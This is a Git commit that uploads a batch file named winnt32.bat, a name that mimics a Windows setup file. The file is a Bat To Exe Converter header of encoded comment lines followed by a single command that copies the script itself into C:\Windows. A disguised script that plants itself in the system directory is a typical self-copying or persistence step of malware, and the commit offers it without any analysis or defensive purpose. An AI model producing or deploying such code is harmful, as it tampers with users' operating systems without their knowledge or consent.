36a37bd51a2516e0eb987d9404ef35ace303da2e
lunikcuza804 <98224575+lunikcuza804@users.noreply.github.com>
2022-01-22 17:44:28 +0200

    Add files via upload

---
+++ winnt32.bat
@@ -0,0 +1,34 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFCt3cCCNK2W2CbQY+9T25uSCoV8cUvYAdIDc1YuHI+8d1RSyLc96gjRTm8Rs
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJnZkwaG0rVXA==
+::ZQ05rAF9IBncCkqN+0xwdVsDAlPMayXtZg==
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQIHIRV6eGQ=
+::dhA7uBVwLU+EWHWR+ks7Kw5OTWQ=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFCt3cCCHL2CuCaUg3eb54+WEqQ0wXew6e53a3KCyN+kd5FG3J9gozn86
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+copy %0 C:\Windows
